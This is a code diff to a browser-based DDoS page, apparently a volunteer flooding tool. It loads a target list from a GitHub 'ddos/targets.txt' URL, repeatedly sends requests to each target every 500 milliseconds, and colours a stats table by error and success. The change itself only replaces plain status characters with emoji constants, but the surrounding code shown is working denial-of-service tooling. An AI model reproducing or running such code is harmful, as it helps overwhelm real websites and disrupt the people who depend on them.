@@ -47,6 +47,9 @@
     <div id="stats"></div>
 
     <script>
+        const ERROR_SYMBOL = "❌";
+        const SUCCESS_SYMBOL = "🔥"
+        const NO_RESPONSE_SYMBOL = "✨";
         let targetsURL = 'https://raw.githubusercontent.com/anondevua/anondevua.github.io/main/ddos/targets.txt';
 
         const updateInterval = 500;
@@ -59,14 +62,15 @@
         function printStats() {
             for (var [target, stats] of Object.entries(targetStats)) {
                 stats.last_responses = stats.last_responses.slice(-40)
-                if (!stats.last_responses.includes("!")) {
+                if (!stats.last_responses.includes(ERROR_SYMBOL)) {
                     stats.last_error = ""
                 }
             }
             var table_body = Object.entries(targetStats).map(
                 ([target, { number_of_requests, number_of_errored_responses, last_responses, last_error }]) => 
                 '<tr style="background-color:' + 
-                    (last_responses.includes('!') ? '#FF0000' : last_responses.includes('+') ? '#00FF00' : '#FFFF00') + 
+                    (last_responses.includes(ERROR_SYMBOL) ? '#FF0000' : 
+                        last_responses.includes(SUCCESS_SYMBOL) ? '#00FF00' : '#FFFF00') + 
                 '"><td>' + target + 
                 '</td><td>' + number_of_requests + 
                 '</td><td>' + number_of_errored_responses + 
@@ -109,17 +113,17 @@
                                 return;
                             }
                             targetStats[target].number_of_errored_responses++;
-                            targetStats[target].last_responses += '!';
+                            targetStats[target].last_responses += ERROR_SYMBOL;
                             targetStats[target].last_error = error.message;
                         })
                         .then((response) => {
                             if (response) {
                                 if (!response.ok) {
                                     targetStats[target].number_of_errored_responses++;
-                                    targetStats[target].last_responses += ".";
+                                    targetStats[target].last_responses += NO_RESPONSE_SYMBOL;
                                 }
                             }
-                            targetStats[target].last_responses += "+";
+                            targetStats[target].last_responses += SUCCESS_SYMBOL;
                             targetStats[target].number_of_requests++;
                         })
                 )
